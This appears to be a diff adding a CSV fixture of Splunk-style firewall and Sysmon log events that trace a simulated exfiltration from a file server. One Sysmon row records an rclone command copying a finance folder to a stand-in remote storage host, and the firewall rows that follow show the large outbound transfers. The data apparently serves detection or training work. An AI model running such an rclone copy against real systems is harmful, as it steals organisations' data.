@@ -1,0 +1,8 @@
+_time,host,source,sourcetype,EventCode,Image,CommandLine,ParentImage,User,Hashes,DestinationIp,DestinationPort,DestinationHostname,src_ip,dest_ip,dest_port,bytes_out,bytes_in,app,action
+2026-11-10T10:08:21.300-03:00,pa-fw-01,udp:514,pan:traffic,,,,,,,,,,10.10.20.23,203.0.113.45,443,4521,188213,ssl,allowed
+2026-11-10T10:30:00.000-03:00,pa-fw-01,udp:514,pan:traffic,,,,,,,,,,10.10.20.41,192.0.2.200,443,20311,993120,ms-office365-base,allowed
+2026-11-10T10:52:12.900-03:00,pa-fw-01,udp:514,pan:traffic,,,,,,,,,,10.10.30.5,203.0.113.45,443,3120,21400000,ssl,allowed
+2026-11-10T10:57:40.120-03:00,SRV-FILE-01,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,1,C:\ProgramData\rc\rclone.exe,C:\ProgramData\rc\rclone.exe copy D:\Financeiro remote:bkp --transfers 8 --config C:\ProgramData\rc\rclone.conf,C:\Windows\System32\cmd.exe,ACME\svc_backup,SHA256=CC3F602C02B85A1D8E589ED90C51AA587ADF921816B27164A996DAAF09607712,,,,,,,,,,
+2026-11-10T10:57:43.004-03:00,SRV-FILE-01,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,XmlWinEventLog:Microsoft-Windows-Sysmon/Operational,3,C:\ProgramData\rc\rclone.exe,,,ACME\svc_backup,,198.51.100.200,443,bkp.example-storage.net,,,,,,,
+2026-11-10T11:14:58.000-03:00,pa-fw-01,udp:514,pan:traffic,,,,,,,,,,10.10.30.5,198.51.100.200,443,1288490188,5521200,ssl,allowed
+2026-11-10T11:31:10.000-03:00,pa-fw-01,udp:514,pan:traffic,,,,,,,,,,10.10.30.5,198.51.100.200,443,1181116006,4810022,ssl,allowed
